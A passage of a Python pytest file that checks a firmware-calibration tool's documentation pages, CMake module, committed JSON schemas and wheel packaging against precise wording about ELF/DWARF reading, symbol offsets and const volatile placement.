            "record: with `--image`, `Inlet.cells[1].v` carries the variable's own symbol, "
            "`Inlet`, and the member's offset from that symbol's address in bytes, both taken "
            "from where the image placed the member."
        ) in spec
        assert (
            "Before the link, and with an address map, which gives a symbol's address and "
            "nothing of a member's offset, the record of a member names its path at offset 0, "
            "and that is a path no linker map can answer."
        ) in spec
        assert self.UNTRIED in spec
        assert "the `SYMBOL_LINK` symbol and the key of the address map" not in spec

    def test_the_concept_page_says_it(self) -> None:
        page = flattened(PAGES["docs/concept.rst"])
        assert (
            "With ``--image`` its record names the variable's symbol and the member's offset "
            "from it, both taken from where the image placed the member"
        ) in page
        assert self.BEFORE in page
        assert self.UNTRIED in page

    def test_the_faq_says_a_map_based_patcher_needs_the_image_run_for_a_member(self) -> None:
        page = flattened(PAGES["docs/faq.rst"])
        assert (
            "for a member only once the a2l was written with ``--image``, where the record "
            "names the variable's symbol and the member's offset from it; before the link the "
            "record of a member names a path no linker map can answer."
        ) in page

    def test_the_readme_says_it(self) -> None:
        readme = flattened(README)
        assert (
            "with `--image` a structure member's names the variable's linker symbol and the "
            "member's offset from it, and before the link, or with a map, it names the member's "
            "path at offset 0, which no linker map can answer."
        ) in readme

    def test_the_types_and_artefacts_pages_say_it(self) -> None:
        types = flattened(PAGES["docs/file_formats/types.rst"])
        assert (
            "the member's path at offset ``0``, which names no symbol a linker map holds. With "
            "``--image`` it names the variable's own symbol, ``Inlet``, and the member's offset "
            "from it in bytes"
        ) in types
        assert "The offset in ``SYMBOL_LINK`` is ``0`` and means it" not in types
        page = flattened(PAGES["docs/generated_artefacts.rst"])
        assert (
            "a structure member names the variable and its own offset when ``--image`` placed "
            "it, and its path at offset 0 before the link or with a map, which is a path no "
            "linker map can answer."
        ) in page


class TestWhatThePagesSayTheImageIsHeldTo:
    """``elf-mismatch`` holds the definition on every image and a consumer's declaration where the
    compiler records it, which clang does not for an extern a unit only reads. The four pages that
    describe the run say so, since a page that promised the header half everywhere would be the
    claim the check exists to retire (finding 1:I12)."""

    CLAUSE = "which gcc does for a variable a unit reads and clang does not"

    def test_the_concept_page_holds_the_definition_everywhere_and_the_header_where_recorded(
        self,
    ) -> None:
        page = flattened(PAGES["docs/concept.rst"])
        assert (
            "it holds the definition of each variable it places - size, encoding, qualifiers "
            "and shape - to the declaration, on every image, and a consumer's ``extern`` to "
            "the qualifiers of its kind where the compiler records it in the debug "
            f"information, {self.CLAUSE}."
        ) in page
        assert "so a template that drops a ``const`` or ``volatile`` the kind carries" not in page

    def test_the_build_page_says_a_header_is_caught_on_a_gcc_image_and_not_a_clang_one(
        self,
    ) -> None:
        page = flattened(PAGES["docs/build_integration.rst"])
        assert "The definition is held on every image" in page
        assert (
            "A consumer's declaration is held to the qualifiers of its kind where the compiler "
            f"records it in the debug information, {self.CLAUSE}, so a component header that "
            "leaves out ``volatile`` is caught on a gcc image and not on a clang one."
        ) in page
        assert "are caught here, in the c that was compiled" not in page

    def test_the_specification_and_the_artefacts_page_name_the_declaration_half(self) -> None:
        spec = flattened(SPEC)
        assert (
            "A unit's declaration of a variable it does not define, a consumer's `extern`, is "
            "held to the qualifiers of its kind the same way where the image's debug "
            "information records it, which gcc's does for a variable a unit reads and "
            "clang's does not."
        ) in spec
        page = flattened(PAGES["docs/generated_artefacts.rst"])
        assert (
            "A consumer's ``extern`` that leaves out a qualifier of its kind is a warning too, "
            "where the compiler records the declaration in the debug information, "
            f"{self.CLAUSE}."
        ) in page


class TestWhereConstVolatileLiesAndWhatAGarbageCollectingLinkDrops:
    """What the pages say of the placement of a ``const volatile`` object, which the committed
    images measure (``test_a_const_volatile_object_lies_...``), and of ``--gc-sections``, which
    the example template's ``DDD_RETAIN`` answers (``TestRetainingADefinition...``)."""

    PLACEMENT = ("README.md", "SPEC.md", "docs/generated_artefacts.rst")
    BRIEF = (
        "docs/concept.rst",
        "docs/getting_started.rst",
        "docs/file_formats/variable_definition.rst",
    )
    GONE = (
        "target independent",
        "out of the read only category",
        "becomes a plain",
        "every byte of it crossing",
        "-A ddd_globals.o",
        "when they are ``const volatile``",
        "leaves ``.rodata`` for ``.data``",
        "out of ``.rodata`` into",
        "stops putting the object in",
        "out of read only memory",
        "should** be confirmed",
        "measured with gcc 12.2.0 on ddd's own generated demo",
        "The definitions reach the image whole",
        "What that costs is not a write that fails",
        "prints, identically at",
    )

    @staticmethod
    def page(name: str) -> tuple[str, str]:
        """The page flattened and lower cased, and the quote its markup writes code in."""
        text = SPEC if name == "SPEC.md" else PAGES[name]
        return flattened(text).lower(), "``" if name.endswith(".rst") else "`"

    @pytest.mark.parametrize("name", [*PLACEMENT, *BRIEF])
    def test_no_page_says_volatile_moves_an_object_out_of_read_only_data(self, name: str) -> None:
        text, _ = self.page(name)
        for gone in self.GONE:
            assert gone.lower() not in text

    @pytest.mark.parametrize("name", [*PLACEMENT, *BRIEF])
    def test_every_page_says_volatile_does_not_move_a_value_to_ram_on_a_toolchain_measured(
        self, name: str
    ) -> None:
        text, q = self.page(name)
        assert f"{q}volatile{q} does not move a value to ram on any toolchain measured" in text

    @pytest.mark.parametrize("name", PLACEMENT)
    def test_the_placement_is_said_with_the_versions_measured_and_what_a_tool_does(
        self, name: str
    ) -> None:
        text, q = self.page(name)
        for sentence in (
            "gcc 14.2.0 (x86_64, i686, aarch64, powerpc and s390x), arm-none-eabi-gcc 14.2.1 and "
            "clang 19.1.7",
            f"hold every {q}const volatile{q} object in {q}.rodata{q}, which is not writable, "
            f"except the small ones on powerpc, which lie in {q}.sdata{q}, a writable section, "
            f"as the plain {q}const{q} objects of their size do",
            "depends on the target and on the compiler's version, and no other version was "
            "measured",
            "is the project's to decide",
            "a tool writes a parameter that stays in flash through an overlay or an emulation "
            "memory",
        ):
            assert sentence.lower() in text

    def test_the_artefacts_page_says_what_the_hosted_program_and_nm_showed(self) -> None:
        text, q = self.page("docs/generated_artefacts.rst")
        for sentence in (
            "on an ordinary hosted build the store faults, a segmentation fault, at "
            f"{q}-O0{q}, {q}-O2{q} and {q}-Os{q}, for {q}const{q} and {q}const volatile{q} alike, "
            f"because both lie in {q}.rodata{q}",
            f"a plain {q}const{q} object reads 3 and {q}apply(1){q} returns 3 at all three "
            f"levels, while memory holds 7 at {q}-O0{q} and still 3 at {q}-O2{q} and {q}-Os{q}",
            f"a {q}const volatile{q} object reads 7 and {q}apply(1){q} returns 7 at all three",
            "what a particular target does with a store to flash is the target's to say, and "
            "was not measured",
            f"{q}nm{q} the class {q}R{q}, not {q}D{q}, on every image measured but the small "
            "objects of powerpc",
        ):
            assert sentence.lower() in text

    @pytest.mark.parametrize("name", BRIEF)
    def test_the_shorter_pages_say_the_placement_is_the_projects_and_depends_on_the_toolchain(
        self, name: str
    ) -> None:
        text, _ = self.page(name)
        assert "depends on the target and on the compiler's version" in text
        assert "the project's to decide" in text

    @pytest.mark.parametrize("name", ["SPEC.md", "docs/templates.rst"])
    def test_the_specification_and_the_templates_page_say_what_gc_sections_does_and_the_macro(
        self, name: str
    ) -> None:
        text, q = self.page(name)
        for sentence in (
            f"a link with {q}--gc-sections{q} drops a definition no code references",
            f"the a2l then carries its object at address 0 or, given the image with "
            f"{q}--image{q}, reports it {q}address-missing{q}",
            f"the example template {q}ddd_globals.c.jinja2{q} puts {q}DDD_RETAIN{q} before every "
            "definition, and it is empty unless the project defines it",
            f"on elf a project that links with {q}--gc-sections{q} defines it as "
            f"{q}__attribute__((used, retain)){q}, which with gcc 15.2.0, binutils 2.46 and "
            f"{q}-fdata-sections{q} kept every object of the demo where the empty macro kept "
            f"none, and {q}used{q} alone kept none",
            f"on pe gcc ignores {q}retain{q}, so the macro does not keep a definition there, and "
            "a reference to the object from code that is linked, or a linker script that keeps "
            "the section, does",
            "linking the demo this way gave the same result on this host with "
            f"{q}-fdata-sections{q} and without it",
        ):
            assert sentence.lower() in text


class TestWhatTheToolboxSaysOfDisagreementsAndCplusplus:
    """The sentences about what the toolbox refuses, reports and leaves to the author."""

    def pages(self) -> tuple[str, str]:
        return flattened(SPEC), flattened(PAGES["docs/toolbox.rst"]).replace("``", "`")

    def test_both_pages_state_that_the_reader_is_for_c_and_refuses_each_cplusplus_shape(
        self,
    ) -> None:
        spec, page = self.pages()
        for text in (spec, page):
            assert "a structure with a base class" in text
            assert "a structure with a static member" in text
            assert "namespace" in text
        assert (
            "reader is for the C that gcc and clang write, and C++ is refused rather than "
            "described wrongly"
        ) in spec
        assert "The reader is for the C that gcc and clang write, and C++ is not described" in page

    def test_both_pages_state_that_units_disagreeing_about_a_variable_are_reported(self) -> None:
        spec, page = self.pages()
        assert (
            "a common symbol declared at two sizes, an array of two lengths, a weak definition "
            "over a strong one of another type"
        ) in spec
        assert "the variable is `elf-type-conflict`, naming both, and is not described" in spec
        assert "a common symbol (`-fcommon`) declared at two sizes, an array declared with two" in (
            page
        )
        assert "The variable is left out, since no one of the descriptions is right" in page

    def test_both_pages_state_which_section_an_overlaid_address_belongs_to(self) -> None:
        spec, page = self.pages()
        assert "It is the section the variable's symbol names (`st_shndx`)" in spec
        assert "`elf-section-ambiguous`, since its section and its initial value cannot" in spec
        assert "the variable's section is the one its symbol names" in page
        assert "a variable that nothing places in either is `elf-section-ambiguous`" in page

    def test_both_pages_state_that_the_identity_is_the_author_s_to_state(self) -> None:
        spec, page = self.pages()
        assert "`--identity-conversions` writes the identity on every entry and member" in spec
        assert "is a `schema` error until its author states it" in spec
        assert "`--identity-conversions` writes the identity where you state it" in page
        assert "``Cal_Gain`` states no `conversion`, and that is deliberate" in page.replace(
            "`Cal_Gain` states", "``Cal_Gain`` states"
        )

    def test_the_largest_float32_is_said_to_be_written_as_the_double_it_is(self) -> None:
        spec, page = self.pages()
        assert "except FLT_MAX and its negative, which are written as the double each is" in spec
        assert "except FLT_MAX and its negative, written as the double each is" in page

    def test_the_pages_limit_the_static_member_refusal_to_where_dwarf_writes_it_as_a_member(
        self,
    ) -> None:
        spec, page = self.pages()
        for text in (spec, page):
            assert "at DWARF 5 gcc writes it apart" in text
            assert "described by its storage" in text

    def test_the_spec_lists_the_scoped_variable_among_the_reasons_image_places_nothing(
        self,
    ) -> None:
        spec, _ = self.pages()
        assert "a variable of a C++ namespace or class, which DDD does not read" in spec

    def test_a_name_two_arguments_reach_is_said_to_be_refused_naming_both(self) -> None:
        spec, page = self.pages()
        assert "naming both arguments, since DDD names an object once" in spec
        assert "are refused too, naming both arguments" in page


class TestWhatTheReaderAndTheToolboxSay:
    """The sentences about the reader's reach and the reasons a variable has no address."""

    def test_the_reader_does_not_claim_every_variation_of_dwarf(self) -> None:
        assert "Every variation of DWARF" not in ELF_SOURCE
        assert "an image it cannot read - type units, gcc's link-time optimisation" in ELF_SOURCE

    def test_the_spec_limits_the_atomic_refusal_to_what_the_debug_information_states(self) -> None:
        spec = flattened(SPEC)
        assert "or an `_Atomic` type where the debug information states it, is refused" in spec
        assert "writes `_Atomic uint32_t` as the plain type, which is then read as one" in spec

    def test_the_spec_and_the_page_state_the_two_messages_the_selection_gives(self) -> None:
        said = (
            "defined where the debug information does not describe it",
            "is `elf-no-storage` once, naming the units",
        )
        spec = flattened(SPEC)
        page = flattened(PAGES["docs/toolbox.rst"]).replace("``", "`")
        for sentence in said:
            assert sentence in spec
        assert "defined where the debug information does not describe it" in page
        assert "is reported once, naming the units, since a unit prefix would take none" in page

    def test_the_spec_and_the_page_tell_a_split_image_and_a_g1_variable_what_they_are(
        self,
    ) -> None:
        """``from-elf`` told a split image that its units had no ``-g`` and a ``-g1`` variable
        that it was ``void``, as the placement of ``--image`` no longer does."""
        spec = flattened(SPEC)
        page = flattened(PAGES["docs/toolbox.rst"]).replace("``", "`")
        assert (
            "or, where the image's debug information is split into `.dwo` files (`-gsplit-dwarf`), "
            "which the reader does not read, to be described there; and a variable `-g1` leaves "
            "without a type is `elf-type-unsupported`, in a sentence saying so"
        ) in spec
        assert (
            "or, in an image whose debug information is split into `.dwo` files (`-gsplit-dwarf`), "
            "is described in those, which the tool does not read"
        ) in page
        assert "and a variable the debug information gives no type, as `-g1` leaves every one" in (
            page
        )


class TestWhatThePagesSayOfAnObjectTheBuildLeftOut:
    """An object that states a condition is left out only where the build holds nothing of it,
    and that rule has to read the same wherever a reader meets it."""

    def test_the_specification_s_address_missing_is_not_for_unconditional_objects_alone(
        self,
    ) -> None:
        spec = flattened(SPEC)
        assert "an object the A2L carries, one that states no condition, gets no" not in spec
        assert (
            "An object that states a condition, and of which the build holds nothing, is not "
            "carried: the A2L leaves it out, as `condition-left-out` says. One the build holds, "
            "and the map or the image does not place, is `address-missing` whatever condition it "
            "states."
        ) in spec
        assert "uncovered, one that states no condition, is `address-missing`" not in spec
        assert (
            "is `address-missing` ([section 4](#4-consistency-checks)), an object that states a "
            "condition among them wherever the build holds anything of it, one it holds nothing "
            "of being left out as above"
        ) in spec

    def test_the_pages_say_what_goes_with_an_object_left_out_is_not_named_by_address_missing(
        self,
    ) -> None:
        """A measurement that asked to stay out of the a2l and was in it only as the input of an
        axis the run left out is not in the file, so no page may say it reaches it."""
        assert (
            "What the A2L leaves out with it is not carried either: a curve or a map over an "
            "axis left out, which `reference-left-out` names, and a measurement that asked to "
            "stay out of the A2L and was in it only as the input of such an axis, which no "
            "finding names."
        ) in flattened(SPEC)
        assert (
            "What the a2l leaves out with it is not reported here either: a curve or a map over "
            "an axis so left out, which ``reference-left-out`` names, and a measurement that "
            "asked to stay out of the file and was in it only as the input of such an axis, "
            "which no finding names."
        ) in flattened(CONSISTENCY_CHECKS)
        assert (
            "What the a2l leaves out with that object is not raised either: a curve or a map "
            "over an axis so left out, and a measurement that asked to stay out of the file and "
            "was in it only as the input of such an axis."
        ) in flattened(PAGES["docs/build_integration.rst"])

    def test_the_specification_says_when_a_linker_s_discard_reads_as_absence(self) -> None:
        """gold leaves a variable of a unit it discarded at an offset with no symbol, and GNU ld
        a tombstone address where it discards a section, both defects to show; GNU ld drops the
        debug information of a unit it discards whole, and nothing is left to read."""
        spec = flattened(SPEC)
        assert (
            "the linker discarded it and the image still shows so, at an address of 0 or all "
            "ones or at one no symbol of its name holds - is a defect"
        ) in spec
        assert (
            "A unit GNU ld discards whole loses its debug information too "
            "([section 6](#6-address-information)), so a variable of it reads as absent and is "
            "left out as one a condition compiled out is"
        ) in spec

    def test_the_specification_names_the_curve_that_goes_with_its_axis_at_warning(self) -> None:
        spec = flattened(SPEC)
        assert "over an axis so left out with it; `condition-left-out` says so at `info`" not in (
            spec
        )
        assert (
            "A curve or a map over an axis so left out goes with it, and since the build holds "
            "the curve or the map, `reference-left-out` names it at `warning`"
        ) in spec

    def test_the_build_page_and_the_check_reference_say_what_the_run_does(self) -> None:
        page = flattened(PAGES["docs/build_integration.rst"])
        assert "once, for the objects that state no condition" not in page
        assert (
            "raises it, once, for the objects it lacks, save a conditional one of which it names "
            "neither the object nor a member, which is left out of the a2l and reported at "
            "``info``: a structure the map names by its own name, as ``nm`` lists it, keeps its "
            "members ``address-missing``"
        ) in page
        reference = flattened(CONSISTENCY_CHECKS)
        assert "would name a record it does not have" not in reference
        assert (
            "leaves a curve or a map out with its axis (``reference-left-out``), and writes an "
            "axis whose input it left out with no input quantity"
        ) in reference

    def test_the_build_page_shows_what_its_example_prints_where_gcc_links_position_independent(
        self,
    ) -> None:
        """Run as the page says, the example's image is position independent on a Debian or
        Ubuntu host, and the step says so first."""
        page = PAGES["docs/build_integration.rst"]
        assert (
            "   firmware.elf: info[image-load-relative]: the image is position independent, so the "
            "addresses the a2l states are offsets from where it loads\n"
            "       note: a project that adds its load base when it reads the a2l is right, and "
            "one that does not finds every address wrong\n"
            "   firmware.elf: info[condition-left-out]: the image has no address for 'ValueG', "
            "which is only present in the build when 'defined(FEATURE_X)'; it is left out of the "
            "a2l\n"
            "       note: the image's debug information holds no variable named 'ValueG'\n"
            "   2 infos\n"
        ) in page
        flat = flattened(page)
        assert (
            "Built where gcc links position independent by default, as it does on a Debian or "
            "Ubuntu host, it prints:"
        ) in flat
        assert (
            "The first is ``image-load-relative``: a position independent image holds offsets "
            "from where it loads, which the a2l states as they are"
        ) in flat
        assert "as ``-no-pie`` links this one, prints the second alone" in flat


class TestTheBuildIntegrationPage:
    """The cmake module is what a build runs, so the page and the module are held together."""

    CMAKE_MODULE = (ROOT / "cmake" / "Ddd.cmake").read_text(encoding="utf-8")

    def test_the_component_target_holds_back_what_the_registry_says(self) -> None:
        """A hand-kept list of two checks silenced two of the nine; the flag derives them."""
        command = re.search(
            r"\$\{DDD_EXECUTABLE\} check \"\$\{description\}\"(.*?)\n", self.CMAKE_MODULE
        )
        assert command is not None, "the module no longer checks a component on its own"
        assert "--standalone" in command.group(1), command.group(1)
        assert "-W" not in command.group(1), "a check named by hand beside the derived flag"

    def parsed_options(self) -> set[str]:
        """Every keyword ``ddd_generate`` accepts, read off its ``cmake_parse_arguments``."""
        body = self.CMAKE_MODULE.split("function(ddd_generate image)", 1)[1]
        lists = re.search(
            r'cmake_parse_arguments\(PARSE_ARGV 1 arg\s+"([^"]*)"\s+"([^"]*)"\s+"([^"]*)"\)', body
        )
        assert lists is not None, "ddd_generate no longer parses its arguments in one place"
        return {name for group in lists.groups() for name in group.split(";") if name}

    def test_every_option_of_ddd_generate_has_a_row_on_the_page(self) -> None:
        """An option the module parses and the page does not list is one nobody finds."""
        rows = set(
            re.findall(r"^   \* - ``([A-Z0-9_]+)", PAGES["docs/build_integration.rst"], re.M)
        )
        assert self.parsed_options() <= rows, sorted(self.parsed_options() - rows)

    def test_every_option_of_ddd_generate_is_named_in_the_readme(self) -> None:
        named = set(re.findall(r"`([A-Z0-9_]+)`", README))
        assert self.parsed_options() <= named, sorted(self.parsed_options() - named)

    def test_every_target_ddd_generate_creates_has_a_row_on_the_page(self) -> None:
        """The module's header lists what the call creates, and the page's table is where a
        reader looks a target up: one listed in either alone is one somebody misses."""
        created = re.findall(r"^# \* (<stem>_ddd_\w+)", self.CMAKE_MODULE, re.M)
        rows = re.findall(
            r"^   \* - ``(<stem>_ddd_\w+)``", PAGES["docs/build_integration.rst"], re.M
        )
        assert created, "the module's header no longer lists the targets it creates"
        assert sorted(rows) == sorted(created)

    def test_the_generated_project_names_its_plugins(self) -> None:
        """The project the module writes has to carry what the call declared, plugins included."""
        template = re.search(
            r"file\(GENERATE\s+OUTPUT \"\$\{output\}\"\s+CONTENT \"(.*?)\"\)",
            self.CMAKE_MODULE,
            re.S,
        )
        assert template is not None, "the module no longer writes the project with file(GENERATE)"
        assert '\\"plugins\\"' in template.group(1), template.group(1)

    def test_the_schema_step_closes_over_the_plugins(self) -> None:
        step = re.search(r"schema all --output \"\$\{directory\}\"([^\n]*)", self.CMAKE_MODULE)
        assert step is not None, "the module no longer writes the schemas"
        assert "plugin" in step.group(1), step.group(0)

    def test_plugins_and_project_exclude_each_other(self) -> None:
        """Two lists of plugins would be two sources of truth; the module refuses the pair."""
        assert re.search(r"FATAL_ERROR \"ddd_generate: PLUGINS[^\"]*PROJECT", self.CMAKE_MODULE)

    def test_the_pages_say_when_a_plugins_file_reaches_a_component_compiling_it(self) -> None:
        """The module cannot declare a plugin's files, whose names the plugin chooses when it
        runs, so under Ninja a change of one reaches a component compiling it a build late,
        however that component is ordered after the generation: the page offered that ordering
        as what keeps the component right. It says what happens instead, under either generator,
        and what a project can do - depending on the dictionary, which a description change
        reaches and an edit of the plugin's code does not - and so does the specification."""
        page = flattened(PAGES["docs/build_integration.rst"])
        assert "so a target that consumes one depends on" not in page
        assert (
            "under Ninja that is not enough, a change of the file reaching a component compiling "
            "it a build late"
        ) in page
        assert (
            "under Ninja a change of one reaches a component compiling it a build late: ninja "
            "looked at the file before the generation rewrote it, however the component is "
            "ordered after the generation"
        ) in page
        assert (
            "a project making the component's object depend on the dictionary - "
            "``set_source_files_properties(<file> PROPERTIES OBJECT_DEPENDS <dictionary>)``, the "
            "path being the image's ``DDD_DICTIONARY`` property - has such a change reach the "
            "component in one build"
        ) in page
        assert (
            "An edit of the plugin's own code that changes only what it writes, and not its model, "
            "leaves the dictionary as it was, and reaches the component a build late all the "
            "same. Under a Makefile generator the build after "
            "either is right. A clean leaves a plugin's files"
        ) in page
        assert "A ``{component}`` header has no such rule, nor has a plugin's file" in page
        spec = flattened(SPEC)
        assert (
            "A plugin's files are declared by nothing, so under Ninja a change of one reaches a "
            "component compiling it a build late, however that component is ordered after the "
            "generation"
        ) in spec
        assert (
            "a component whose object depends on the dictionary - `OBJECT_DEPENDS` on the path of "
            "`DDD_DICTIONARY` - is compiled again in that build, while an edit of the plugin's own "
            "code that changes only what it writes, and not its model, leaves the dictionary as "
            "it was and still reaches it a build late"
        ) in spec

    def test_the_pages_say_a_renamed_component_reaches_its_readers_a_build_late(self) -> None:
        """A component renamed in its description, in the collected mode, has its header
        declared under the old name until the build is configured again: under Ninja the build
        after a change of the new header compiles its readers against the old one, which is
        what declaring the headers is for, and the pages said only that the generation runs at
        every build."""
        page = flattened(PAGES["docs/build_integration.rst"])
        assert (
            "so under Ninja the generation runs at every build for the header of the old one, "
            "which it no longer writes, and a change of the new one reaches the components "
            "reading it a build late"
        ) in page
        assert (
            "until which, under Ninja, the generation runs at every build and a change of that "
            "component's header reaches its readers a build late"
        ) in flattened(SPEC)

    def test_the_page_says_an_lto_image_cannot_be_read_by_the_image_step(self) -> None:
        """The tool refuses an image gcc linked with ``-flto``, and the page leading with
        ``ADDRESSES_FROM_IMAGE`` says so in the words of the refusal, and what to do."""
        page = flattened(PAGES["docs/build_integration.rst"])
        refusal = (
            "its DWARF comes from gcc's link-time optimisation, which this tool does not read; "
            "build it without -flto"
        )
        assert refusal in ELF_SOURCE.replace('"\n            f"', "")
        assert f'exit 2, with "{refusal}"' in page
        assert (
            "A project that links with ``-flto`` and keeps it takes its addresses from a map "
            "instead (``ADDRESS_MAP``, below)"
        ) in page
        assert "built with ``-g`` and without ``-flto``" in page

    def test_the_example_is_shown_as_shipped_without_its_comments(self) -> None:
        """The page calls its block the shipped file minus comments, so that is what it is."""
        shipped = (ROOT / "examples" / "cmake" / "CMakeLists.txt").read_text(encoding="utf-8")
        expected = [line for line in shipped.splitlines() if not line.lstrip().startswith("#")]
        page = PAGES["docs/build_integration.rst"]
        block = re.search(
            r"with its\ncomments removed[^\n]*\n\n\.\. code-block:: cmake\n\n((?:   .*\n|\n)+)",
            page,
        )
        assert block is not None, "the page no longer shows the example after that sentence"
        shown = [line[3:] for line in block.group(1).rstrip("\n").splitlines()]
        assert shown == expected


class Undocumented(StrEnum):
    """A set of values whose members say nothing about themselves.

    Defined here rather than found in the sources, because every enum the product publishes is
    documented - which is exactly what makes the path taken when one is not hard to reach.
    """

    RED = "red"
    GREEN = "green"


class PartlyDocumented(StrEnum):
    """One member with a docstring under it and one without."""

    KNOWN = "known"
    """What this one is for."""

    UNKNOWN = "unknown"


class Tagged(BaseModel):
    """A model over both, to see what a generator makes of them."""

    shade: Undocumented
    tag: Literal[Undocumented.RED] = Undocumented.RED


class TestCarryingTheDocumentationAcross:
    """The machinery behind :class:`PublishedSchema`, at the edges the contracts do not reach."""

    @pytest.mark.parametrize(
        ("written", "shown"),
        [
            (":class:`Limits`", "``Limits``"),
            (":data:`~ddd.models.common.Identifier`", "``Identifier``"),
            (":doc:`the project file <project>`", "``the project file``"),
            (":doc:`<project>`", "``project``"),
            ("nothing to do here", "nothing to do here"),
        ],
    )
    def test_a_role_becomes_the_text_sphinx_would_have_shown(
        self, written: str, shown: str
    ) -> None:
        from ddd.models.schema import as_markdown

        assert as_markdown(written) == shown

    def test_the_marker_of_an_rst_literal_block_does_not_reach_the_reader(self) -> None:
        """In markdown the indent alone makes the block, so the ``::`` is just two characters."""
        from ddd.models.schema import as_markdown

        assert as_markdown("accepts this form::\n\n    {}\n") == "accepts this form:\n\n    {}\n"

    def test_a_member_with_no_docstring_is_left_out(self) -> None:
        from ddd.models.schema import value_documentation

        assert value_documentation(PartlyDocumented) == {"known": "What this one is for."}

    def test_annotated_assignments_are_read_as_well_as_plain_ones(self) -> None:
        """Enum members are assigned, model fields are annotated; both carry a docstring."""
        from ddd.models import Project
        from ddd.models.schema import member_docstrings

        assert "also the a2l project and module name" in member_docstrings(Project)["name"]

    def test_a_class_with_no_readable_source_documents_nothing(self) -> None:
        """A schema published without the per-value docs beats a schema not published at all."""
        from ddd.models.schema import member_docstrings

        assert member_docstrings(type("Built", (), {})) == {}

    def test_something_that_is_not_a_class_documents_nothing(self) -> None:
        from ddd.models.schema import member_docstrings

        assert member_docstrings(commands) == {}  # type: ignore[arg-type]

    def test_an_undocumented_set_of_values_is_published_as_pydantic_wrote_it(self) -> None:
        """No half measure: silence is better than a dropdown that explains only some entries."""
        from ddd.models.schema import PublishedSchema

        schema = Tagged.model_json_schema(schema_generator=PublishedSchema)
        assert schema["$defs"]["Undocumented"]["enum"] == ["red", "green"]
        assert "enumDescriptions" not in schema["$defs"]["Undocumented"]
        assert "description" not in schema["properties"]["tag"]


class TestCommittedSchemas:
    """The schemas in ``schemas/`` are generated, committed and pointed at by the examples.

    Committing a derived artefact is a deliberate exception to how the rest of this
    repository works, and it is made for one reason: an editor cannot bind a description
    file to a schema that is not there, so cloning the project or unpacking the sdist has to
    be enough to get completion and validation on the examples. The price of the exception is
    that it can go stale, which is what these tests are for.
    """

    def test_every_committed_schema_is_current(self) -> None:
        from ddd.cli import SCHEMA_FILENAME, schema_models, schema_text

        for kind in sorted(schema_models()):
            path = ROOT / "schemas" / SCHEMA_FILENAME.format(kind=kind)
            assert path.is_file(), f"{path.name} is missing; run: ddd schema all -o schemas"
            assert path.read_text(encoding="utf-8") == schema_text(kind), (
                f"{path.name} is out of date with the models. Regenerate it with "
                f"'ddd schema all -o schemas' and commit the result."
            )

    def test_every_example_points_at_a_schema_that_exists(self) -> None:
        """A dangling ``$schema`` is worse than none: the editor reports it on every open."""
        bound = 0
        for path in sorted((ROOT / "examples").rglob("*.ddd.json")):
            document = json.loads(path.read_text(encoding="utf-8"))
            reference = document.get("$schema")
            assert reference is not None, f"{path.name} carries no $schema binding"
            target = (path.parent / reference).resolve()
            assert target.is_file(), f"{path.name} points at {reference}, which does not exist"
            # and it points at the schema of the kind it actually is
            kind = next(
                key
                for key in (
                    "project",
                    "component",
                    "types",
                    "units",
                    "sections",
                    "constants",
                    "rasters",
                )
                if key in document
            )
            assert target.name == f"ddd_{kind}.schema.json", (
                f"{path.name} is a {kind} file but points at {target.name}"
            )
            bound += 1
        assert bound, "no examples were checked; has the layout changed?"

    def test_the_examples_validate_against_their_own_schemas(self) -> None:
        """What an editor does with the binding, done here so it cannot silently break.

        jsonschema is a development dependency rather than something this skips without, which
        is the whole point: skipping is how a check that guards an integration stops running
        without anybody deciding that it should.
        """
        for path in sorted((ROOT / "examples").rglob("*.ddd.json")):
            document = json.loads(path.read_text(encoding="utf-8"))
            schema = json.loads((path.parent / document["$schema"]).read_text(encoding="utf-8"))
            jsonschema.validate(document, schema)


class TestPackagedResources:
    """Paths into the installed package, which a source checkout can hide being wrong.

    ``ddd templates-dir`` and ``ddd cmake-dir`` look for files that are force-included into
    the wheel. Both fall back to the repository layout, so a miscounted ``parents[n]`` still
    works in a checkout and fails only once somebody installs the wheel - which is to say,
    only for a customer.
    """

    def test_the_package_root_is_the_ddd_package(self) -> None:
        import ddd
        from ddd.backends.c.backend import package_root

        assert package_root() == Path(ddd.__file__).resolve().parent

    def test_the_wheel_ships_what_those_commands_look_for(self) -> None:
        """Each force-included destination has to be where the lookup expects to find it."""
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        destinations = set(
            metadata["tool"]["hatch"]["build"]["targets"]["wheel"]["force-include"].values()
        )
        assert "ddd/templates" in destinations, "ddd templates-dir would find nothing installed"
        assert "ddd/cmake/Ddd.cmake" in destinations, "ddd cmake-dir would find nothing installed"

    def test_the_archives_carry_the_compiled_gui_pages(self) -> None:
        """git ignores the pages npm compiles, and only an artifact pattern puts a file git
        ignores into an archive - without it the wheel installs a ddd gui with nothing to serve."""
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        targets = metadata["tool"]["hatch"]["build"]["targets"]
        assert "/src/ddd/gui/static" in targets["wheel"]["artifacts"]
        assert "/src/ddd/gui/static" in targets["sdist"]["artifacts"]
        assert "/gui" in targets["sdist"]["include"]

    @pytest.mark.parametrize(
        ("source", "start"),
        [
            (".github/workflows/publish.yml", "\n  build:\n"),
            ("docker/Dockerfile", " AS pages\n"),
            (".github/workflows/ci.yml", "\n  dev-build:\n"),
        ],
        ids=["the release build", "the image", "the development build"],
    )
    def test_every_build_that_packages_the_pages_type_checks_them(
        self, source: str, start: str
    ) -> None:
        """``npm run build`` is ``vite build``, which strips the types without checking them, so
        a file format the pages have not caught up with fails a build only where the type check
        runs. A release can be cut from a commit ci never saw, and an image built from a tree
        it never saw; without the check the types generated before the build are generated for
        nothing."""
        section = (ROOT / source).read_text(encoding="utf-8").split(start, 1)[1]
        command = next(
            line
            for line in section.splitlines()
            if "npm run build" in line and not line.lstrip().startswith("#")
        )
        assert "npm run schemas && npm run typecheck && npm run build" in command, command.strip()

    def test_the_developer_page_names_the_licences_the_pages_may_bundle(self) -> None:
        """Exactly the ones the build accepts: "BSD" named a family whose members other than
        the two listed the build turns away."""
        script = (ROOT / "gui" / "scripts" / "licenses.mjs").read_text(encoding="utf-8")
        listed = re.search(r"const ALLOWED = new Set\(\[(.*?)\]\)", script)
        assert listed is not None, "gui/scripts/licenses.mjs no longer lists what it accepts"
        named = re.search(
            r"refuses a bundled package whose licence is not (.+?)\.(?:\s|$)",
            flattened(PAGES["docs/developer_documentation.rst"]),
        )
        assert named is not None, "the developer page no longer says which licences are accepted"
